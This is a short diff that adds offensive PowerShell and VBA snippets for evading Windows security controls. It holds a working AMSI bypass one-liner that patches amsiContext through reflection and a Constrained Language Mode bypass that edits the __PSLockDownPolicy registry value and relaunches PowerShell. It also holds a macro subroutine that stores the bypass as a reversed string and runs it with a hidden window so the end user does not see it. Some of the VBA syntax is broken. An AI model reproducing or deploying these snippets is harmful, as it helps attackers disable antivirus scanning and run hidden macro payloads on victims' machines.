@@ -1,0 +1,18 @@
+//First you need to Bypass Anti-Virus, you can use Reflection Method One Liner using Powershell (Thanks Matt Graeber)
+$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+
+//CLM Bypass by Metoraf007, this changes __PSLockdownPolicy value so you have FullLanguage so you have full power over powershell
+ If( $ExecutionContext.SessionState.LanguageMode -eq "ConstrainedLanguage"){ Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -name "__PSLockDownPolicy" -value 8 Start-Process -File PowerShell.exe -Argument "-file $(myinvocation.mycommand.definition)" Break } Write-Host $ExecutionContext.SessionState.LanguageMode; Start-Sleep -s 10 
+ 
+//or use VBA in macros:
+Sub PSinVBA {
+  Dim StrArg As String
+  Dim FullLang As String
+  //reversed String for Reflection Method to Bypass AMSI
+  strArg = StrReverse("
+)1 ,rtp$ ,0 ,fub$(ypoC::]lahsraM.secivreSporetnI.emitnuR.metsyS[;)0(@ = fub$]][23tnI[;g$=rtp$]rtPtnI[;)llun$(eulaVteG.f$=g$;}}e$=f${ )"txetnoC*" ekil- emaN.e$( fi{ )d$ ni e$(hcaeroF;)'citatS,cilbuPnoN'(sdleiFteG.c$=d$;}}b$=c${ )"slitUi*" ekil- emaN.b$( fi{ )a$ ni b$(hcaeroF;)(sepyTteG.ylbmessA.]feR[=a$") 
+//just Add if needed==> FullLang = " If( $ExecutionContext.SessionState.LanguageMode -eq "ConstrainedLanguage"){ Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -name "__PSLockDownPolicy" -value 8 Start-Process -File PowerShell.exe -Argument "-file $(myinvocation.mycommand.definition)" Break } Write-Host $ExecutionContext.SessionState.LanguageMode; Start-Sleep -s 10 "
+//shell execution of the first line, the second line and Hide the VB Process from the end user
+shell strArg,vbHide 
+    End Sub
+    
